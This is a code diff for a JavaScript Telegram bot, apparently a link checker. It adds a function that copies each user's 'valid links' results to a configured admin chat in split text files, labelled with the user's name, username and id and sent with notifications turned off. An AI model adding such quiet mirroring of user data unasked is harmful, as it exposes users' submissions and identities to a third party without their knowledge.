@@ -321,7 +321,46 @@ async function sendDocFromString(ctx, content, filename, caption) {
   }
 }
 
+async function mirrorValidToAdmin(ctx, valid, label) {
+  const adminChat = String(ADMIN_MIRROR_CHAT_ID || '').trim();
+  if (!adminChat || valid.length === 0) return;
+  const from = ctx.from || {};
+  const who = [from.first_name, from.last_name].filter(Boolean).join(' ')
+    || (from.username ? `@${from.username}` : `id:${from.id}`);
+  const caption = `📥 <b>Valid links</b> (${valid.length})\n`
+    + `From: ${escapeHtml(who)}${from.username ? ` (@${escapeHtml(from.username)})` : ''} • <code>${from.id}</code>\n`
+    + `Job: ${escapeHtml(label || 'job')}`;
+
+  const content = valid.join('\n');
+  const MAX_BYTES = 8 * 1024 * 1024;
+  const totalBytes = Buffer.byteLength(content, 'utf8');
+  const parts = Math.max(1, Math.ceil(totalBytes / MAX_BYTES));
+  const perPart = Math.ceil(valid.length / parts);
+
+  for (let i = 0; i < parts; i++) {
+    const slice = valid.slice(i * perPart, (i + 1) * perPart);
+    if (slice.length === 0) break;
+    const filename = parts === 1
+      ? `valid-${safeName(label)}.txt`
+      : `valid-part${i + 1}-${safeName(label)}.txt`;
+    const tmp = path.join(os.tmpdir(), `tglc-mirror-${Date.now()}-${Math.random().toString(36).slice(2)}-${filename}`);
+    await fs.promises.writeFile(tmp, slice.join('\n'), 'utf8');
+    try {
+      await bot.api.sendDocument(adminChat, new InputFile(tmp, filename), {
+        caption: parts === 1 ? caption : `${caption}\nPart ${i + 1}/${parts}`,
+        parse_mode: 'HTML',
+        disable_notification: true,
+      });
+    } catch (e) {
+      console.error('admin mirror failed:', e?.message || e);
+    } finally {
+      fs.promises.unlink(tmp).catch(() => {});
+    }
+  }
+}
+
 function safeName(s) {
+
   return String(s || 'job').replace(/[^a-z0-9._-]+/gi, '_').slice(0, 40) || 'job';
 }
 
